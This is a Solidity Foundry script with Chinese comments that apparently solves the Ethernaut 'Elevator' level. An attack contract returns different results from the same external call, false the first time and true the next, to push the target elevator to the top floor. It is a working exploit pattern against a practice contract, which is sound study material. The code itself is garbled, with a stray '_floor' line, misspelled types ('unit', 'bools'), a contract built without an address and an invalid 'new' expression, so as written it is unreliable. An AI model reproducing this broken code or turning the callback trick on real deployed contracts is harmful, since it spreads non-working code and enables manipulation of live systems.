// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/Elevator.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

// target 讓合約的電梯能到達頂樓
// 此合約的風險 external call 錯誤運用
// 呼叫同一個 external call 兩次卻能得到不同的回傳結果

contract attackCon {
    bool myswitch;
    Elevator public lev11Instance = Elevator();

    function startAttack() external {
        lev11Instance.goTo(0);
    }
_floor
    function isLastFloor(unit _floor) external returns (bools) {
        // 問題 _floor 在這邊是要？
        if (!myswitch) {
            myswitch = true;
            return false;
        } else {
            return true;
        }
    }
}

contract Lev10Sol is Script {
    // Elevator public lev11Instance = Elevator(payable());

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        lev11Instance startInstance = new lev11Instance();
        startInstance.startAttack();
        vm.stopBroadcast();
    }
}
